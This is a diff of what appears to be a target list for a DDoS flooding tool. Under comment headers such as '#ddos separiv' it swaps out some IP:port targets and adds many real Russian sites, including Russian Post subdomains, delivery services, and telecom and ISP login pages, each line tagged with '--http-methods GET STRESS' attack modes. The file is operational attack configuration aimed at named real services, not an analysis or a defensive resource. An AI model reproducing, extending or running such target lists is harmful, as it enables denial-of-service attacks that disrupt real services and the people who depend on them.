@@ -5,13 +5,15 @@ https://cdek.by/ru/ tcp://78.46.28.63:443 tcp://195.189.222.60:993 --http-method
 
 
 #gaidamaky
-tcp://95.142.39.168:25 tcp://95.142.39.168:25 tcp://95.142.39.168:443 tcp://95.142.39.168:465 
-http://rus-tv.com/ tcp://95.142.39.168:587 tcp://95.142.39.168:3306 --http-methods STRESS 
+tcp://5.188.186.126:443 tcp://185.31.134.104:443 
 
 
 
 #ddos separiv
-https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com tcp://91.215.37.57:25 --http-methods GET STRESS
-https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru tcp://91.215.36.57:25 --http-methods GET STRESS
-https://otpravka.pochta.ru http://128.140.175.200:80 https://128.140.175.200:443 --http-methods GET STRESS
-
+https://dostavista.ru https://couriers.dostavista.ru https://www.delivery-club.ru/moscow --http-methods GET STRESS
+https://dotochki.com https://www.pochta.ru https://podpiska.pochta.ru --http-methods GET STRESS
+https://zakaznoe.pochta.ru https://otpravka.pochta.ru https://finance-android.pochta.ru --http-methods GET STRESS 
+https://m1-service.pochta.ru https://tracking.pochta.ru https://mail.pochta.ru --http-methods GET STRESS
+https://priem.pochta.ru https://edo.pochta.ru https://voronezh.market.pochta.ru https://tariff.gslbdmz.pochta.ru --http-methods GET STRESS
+https://msk.rt.ru https://b2c.passport.rt.ru/auth https://www.onlime.ru/bonus/rules/ https://www.ecotelecom.ru https://my.ecotelecom.ru/login?page=/ --http-methods GET 
+https://moskva.beeline.ru/customers/products/ https://moskva.myttk.ru/ https://b2b.ttk.ru/ https://msk.dom.ru https://www.akado.ru --http-methods GET
